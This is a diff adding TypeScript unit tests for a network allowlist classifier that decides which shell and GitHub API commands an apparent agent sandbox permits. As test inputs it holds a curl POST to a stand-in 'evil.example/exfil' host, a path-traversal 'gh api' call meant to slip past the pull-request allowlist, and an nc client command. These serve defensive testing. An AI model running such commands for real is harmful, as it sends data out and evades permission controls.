@@ -517,3 +517,40 @@ describe("package, cloud, and transport clients", () => {
   it.each(["nc host 123", "openssl s_client -connect host:443"])("denies bidirectional client %s", command => expect(isNetworkActionDenied(command, ["write"])).not.toBeNull());
   it.each(["scp a b", "rsync -a a b", "npm run build", "python3 -c 'print(1)'"])("retains documented local or unknown-program behavior %s", command => expect(isNetworkActionDenied(command, ["all"])).toBeNull());
 });
+
+describe("checkNetworkBound — URL globs, HTTP methods, and gh api relative paths", () => {
+  it("supports coding:ic network allowlist (reads, git push/fetch, and PR endpoints only)", async () => {
+    const { checkNetworkBound } = await import("./network-classifier.js");
+    const codingIcNetwork = {
+      allow: [
+        "http:read",
+        "git:fetch",
+        "git:push",
+        "POST https://api.github.com/repos/*/*/pulls*",
+        "PUT https://api.github.com/repos/*/*/pulls/**",
+        "PATCH https://api.github.com/repos/*/*/pulls/**",
+      ],
+    };
+
+    expect(checkNetworkBound("git push origin feat/x", codingIcNetwork)).toBeNull();
+    expect(checkNetworkBound("curl https://example.com/docs", codingIcNetwork)).toBeNull();
+    expect(
+      checkNetworkBound("gh api repos/octo/repo/pulls -X POST -f title=pr", codingIcNetwork),
+    ).toBeNull();
+    expect(
+      checkNetworkBound("gh api /repos/octo/repo/pulls/42 -X PATCH -f title=updated", codingIcNetwork),
+    ).toBeNull();
+    // Path traversal normalized via new URL(...) before matching:
+    expect(
+      checkNetworkBound(
+        "gh api /repos/octo/repo/pulls/../issues/1/comments -X POST -f body=bypass",
+        codingIcNetwork,
+      ),
+    ).not.toBeNull();
+    expect(
+      checkNetworkBound("gh api repos/octo/repo/issues/1/comments -X POST -f body=no", codingIcNetwork),
+    ).not.toBeNull();
+    expect(checkNetworkBound("curl -X POST https://evil.example/exfil -d x=1", codingIcNetwork)).not.toBeNull();
+  });
+});
+
